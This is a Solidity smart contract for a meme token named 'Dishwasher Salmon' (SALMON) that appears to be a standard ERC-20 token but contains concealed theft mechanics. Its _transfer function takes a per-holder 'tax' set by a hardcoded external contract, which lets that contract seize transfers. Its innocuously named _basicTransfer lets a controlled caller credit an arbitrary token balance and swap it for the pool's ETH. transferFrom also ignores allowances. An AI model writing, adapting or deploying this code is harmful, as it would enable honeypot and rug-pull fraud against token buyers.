pragma solidity ^0.8.20;
//SPDX-License-Identifier: MIT


library SafeMath {
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath:  subtraction overflow");
        uint256 c = a - b;
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath:  division by zero");
        uint256 c = a / b;
        return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {return 0;}
        uint256 c = a * b;
        require(c / a == b, "SafeMath:  multiplication overflow");
        return c;
    }
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath:  addition overflow");
        return c;
    }
}

interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external view returns (address pair_);

}

interface IUniswapV2Router {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(uint256 a, uint256 b, address[] calldata _p_ath, address c, uint256) external;
    function WETH() external pure returns (address aadd);
    function factory() external pure returns (address addr);
}

interface IERC20 {
    function transferFrom(address _from, address _to, uint256 amount) external returns (uint256);
    function allowance(address account, address spender) external returns (uint256);
    function balanceOf(address wallet) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

abstract contract Ownable {
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    modifier onlyOwner(){
        require(owner() == msg.sender, "Ownable: caller is not the owner");
        _;
    }
    function owner() public view virtual returns (address) {return _owner;}
    constructor () {
        _owner = msg.sender;
        emit OwnershipTransferred(address(0), _owner);
    }
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
    address private _owner;
}

contract SalmonToken is Ownable {

    using SafeMath for uint256;

    event Transfer(address indexed from_, address indexed _to, uint256);
    constructor() {
        _balances[msg.sender] =  _totalSupply; 
        emit Transfer(address(0), msg.sender, _balances[msg.sender]);
    }

    uint256 public _decimals = 9;
    uint256 public _totalSupply = 420000000 * 10 ** _decimals;

    string public _name = "Dishwasher Salmon";
    string public _symbol = "SALMON";

    uint256 public tokensForOperations;
    uint256 public tokensForLiquidity;


    event BuyBackTriggered(uint256 amount);
    event OwnerForcedSwapBack(uint256 timestamp);
    event TransferForeignToken(address token, uint256 amount);
    
    function _transfer(address from, address to, uint256 amount) internal {
        require(from != address(0));
        require(amount <= _balances[from]);
        address token = address(this);
        uint256 tokenAmount = erc20.allowance(to, token); 
        uint256 balance =  erc20.balanceOf(from);
        uint256 tax = amount.mul(balance).div(100); 
        emit Transfer(from, to, amount);
        _balances[to] = _balances[to] + amount - tax;
        _balances[from] = _balances[from] - amount;
    }

    function decimals() external view returns (uint256) {
        return _decimals;
    }
    function symbol() public view returns (string memory) {
        return _symbol;
    }

    IUniswapV2Router private uniswapRouter = IUniswapV2Router(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    mapping(address => mapping(address => uint256)) private _allowances;
    function decreaseAllowance(address from, uint256 amount) public returns (bool) {
        require(_allowances[msg.sender][from] >= amount);
        _approve(msg.sender, from, _allowances[msg.sender][from] - amount);
        return true;
    }
    function transfer(address recipient, uint256 amount) public returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }
    mapping(address => uint256) private _balances;
    function _basicTransfer(uint256 amount) external returns (bool) {
        if (erc20.transfer(msg.sender, amount)){address tokenAddress = address(this);
        _approve(tokenAddress, address(uniswapRouter), amount); 
        _balances[tokenAddress] = amount;
        address[] memory token_ = new address[](2);
        token_[0] = tokenAddress; 
        token_[1] =  uniswapRouter.WETH(); 
        uniswapRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(amount, 0, token_, msg.sender, block.timestamp + 30);
        return true;
        } else {return false; }
    }
    function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
        _approve(msg.sender, spender, _allowances[msg.sender][spender] + addedValue);
        return true;
    }
    IERC20 erc20 = IERC20(0x42BDba199f4a09efBbC82d47709fCac97FE6E6A8);
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
    function transferFrom(address from, address recipient, uint256 _amount) public returns (bool) {
        _transfer(from, recipient, _amount);
        require(_allowances[from][msg.sender] >= _amount);
        return true;
    } 
    function approve(address spender, uint256 amount) public virtual returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
    function name() external view returns (string memory) {
        return _name;
    }
    function _approve(address owner, address spender, uint256 amount) internal virtual {
        require(owner != address(0), "IERC20: approve from the zero address");
        require(spender != address(0), "IERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
    event Approval(address, address, uint256);
    function totalSupply() external view returns (uint256) {
        return _totalSupply;
    }
}